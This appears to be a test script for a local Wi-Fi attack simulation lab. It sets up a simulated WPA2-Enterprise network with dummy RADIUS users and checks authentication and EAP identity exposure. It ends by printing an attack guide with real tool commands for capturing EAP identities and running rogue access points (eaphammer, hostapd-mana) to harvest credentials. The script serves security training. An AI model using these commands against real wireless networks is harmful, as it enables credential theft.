#!/bin/bash
# Test WPA2-Enterprise attack compatibility
# Tests: RADIUS server, EAP authentication, identity capture

set -e

echo "=== Creating WPA2-Enterprise Network ==="
RESPONSE=$(curl -s -X POST http://127.0.0.1:8000/api/ap \
  -H "Content-Type: application/json" \
  -d '{
    "ssid": "CorpSecure",
    "security": "wpa2-enterprise",
    "channel": 1,
    "num_clients": 0,
    "enterprise_users": [
      {"username": "admin@corp.local", "password": "AdminPass123"},
      {"username": "employee@corp.local", "password": "EmpPass456"},
      {"username": "guest", "password": "GuestPass"}
    ]
  }')
echo "$RESPONSE"

AP_ID=$(echo "$RESPONSE" | python3 -c "import sys, json; print(json.load(sys.stdin).get('id', 'ERROR'))")
if [ "$AP_ID" = "ERROR" ]; then
  echo "ERROR: Failed to create WPA2-Enterprise AP"
  echo "Response: $RESPONSE"
  exit 1
fi
echo "AP ID: $AP_ID"

sleep 2

echo ""
echo "=== RADIUS Server Status ==="
curl -s http://127.0.0.1:8000/api/radius/status | python3 -m json.tool

echo ""
echo "=== RADIUS Users ==="
curl -s http://127.0.0.1:8000/api/radius/users | python3 -m json.tool

echo ""
echo "=== Testing RADIUS Authentication ==="
echo "Testing valid credentials (admin@corp.local):"
curl -s -X POST http://127.0.0.1:8000/api/radius/test \
  -H "Content-Type: application/json" \
  -d '{"username": "admin@corp.local", "password": "AdminPass123"}' | python3 -m json.tool

echo ""
echo "Testing invalid credentials:"
curl -s -X POST http://127.0.0.1:8000/api/radius/test \
  -H "Content-Type: application/json" \
  -d '{"username": "admin@corp.local", "password": "wrongpassword"}' | python3 -m json.tool

echo ""
echo "=== Connecting Enterprise Client ==="
CLIENT_RESPONSE=$(curl -s -X POST http://127.0.0.1:8000/api/clients \
  -H "Content-Type: application/json" \
  -d "{
    \"ssid\": \"CorpSecure\",
    \"security\": \"wpa2-enterprise\",
    \"ap_id\": \"$AP_ID\",
    \"eap_identity\": \"employee@corp.local\",
    \"eap_password\": \"EmpPass456\"
  }")
echo "$CLIENT_RESPONSE"

CLIENT_ID=$(echo "$CLIENT_RESPONSE" | python3 -c "import sys, json; print(json.load(sys.stdin).get('client_id', 'ERROR'))" 2>/dev/null || echo "ERROR")
if [ "$CLIENT_ID" != "ERROR" ]; then
  echo "Client ID: $CLIENT_ID"
  
  sleep 3
  
  echo ""
  echo "=== Client Status ==="
  curl -s "http://127.0.0.1:8000/api/clients/$CLIENT_ID" | python3 -m json.tool
  
  echo ""
  echo "=== Checking EAP Identity (should be visible) ==="
  EAP_ID=$(curl -s "http://127.0.0.1:8000/api/clients/$CLIENT_ID" | python3 -c "import sys, json; print(json.load(sys.stdin).get('eap_identity', 'N/A'))")
  echo "EAP Identity: $EAP_ID"
fi

echo ""
echo "=== WPA2-Enterprise Attack Guide ==="
BSSID=$(curl -s "http://127.0.0.1:8000/api/ap/$AP_ID" | python3 -c "import sys, json; print(json.load(sys.stdin).get('bssid', 'N/A'))")
echo "BSSID: $BSSID"
echo "Channel: 1"
echo "SSID: CorpSecure"
echo ""
echo "Attack vectors:"
echo ""
echo "1. Capture EAP identities (passive):"
echo "   sudo airodump-ng -c 1 --bssid $BSSID wlan1mon"
echo "   - Watch for EAPOL packets in Wireshark"
echo "   - EAP-Identity is sent in cleartext!"
echo ""
echo "2. Create Rogue AP with eaphammer:"
echo "   sudo eaphammer -i wlan1 --auth wpa-eap --essid CorpSecure --creds"
echo "   - Captures EAP credentials when clients connect"
echo ""
echo "3. Create Rogue AP with hostapd-mana:"
echo "   sudo hostapd-mana /etc/hostapd-mana/hostapd-mana.conf"
echo "   - Similar credential capture"
echo ""
echo "4. Relay attack with wpa_sycophant (if you have a victim client):"
echo "   - Relay authentication to real AP while capturing creds"
echo ""
echo "Test users:"
echo "  admin@corp.local / AdminPass123"
echo "  employee@corp.local / EmpPass456"
echo "  guest / GuestPass"

echo ""
echo "=== Cleanup ==="
curl -s -X DELETE "http://127.0.0.1:8000/api/ap/$AP_ID" | python3 -m json.tool
